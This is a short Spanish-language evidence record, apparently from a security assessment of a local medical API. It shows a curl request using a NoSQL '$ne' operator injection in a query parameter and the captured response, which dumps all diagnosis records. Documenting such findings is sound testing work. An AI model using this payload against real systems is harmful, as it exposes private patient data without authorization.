# Evidencia evidencia_A03

```text
# Evidencia A03 - Inyección NoSQL ($ne)
# Fecha: 2026-10-04 03:40:20   Fase: fase1   Objetivo: localhost
# Comando: curl -i -s 'http://localhost:3000/api/diagnosis/search?diagnosis[$ne]=null' -H 'Authorization: <TOKEN_DOCTOR>'
# Esperado: HTTP 200 con TODOS los diagnósticos (count: 5)
# ----------------------------------------------------------
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 479
ETag: W/"1df-MwA1zkRmc8kAT608iQh6Rsxg9l8"
Date: Sun, 04 Oct 2026 06:40:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"count":5,"results":[{"id":1,"patientId":1,"diagnosis":"Hipertension","date":"2024-01-15","severity":"moderada"},{"id":2,"patientId":1,"diagnosis":"Diabetes Tipo 2","date":"2024-03-20","severity":"leve"},{"id":3,"patientId":2,"diagnosis":"Asma bronquial","date":"2024-02-10","severity":"moderada"},{"id":4,"patientId":2,"diagnosis":"Gastritis","date":"2024-05-05","severity":"leve"},{"id":5,"patientId":3,"diagnosis":"Fractura de radio","date":"2024-04-01","severity":"grave"}]}

# [curl exit code: 0 (0 = OK, 7 = conexión rechazada, 35/60 = error TLS)]

```
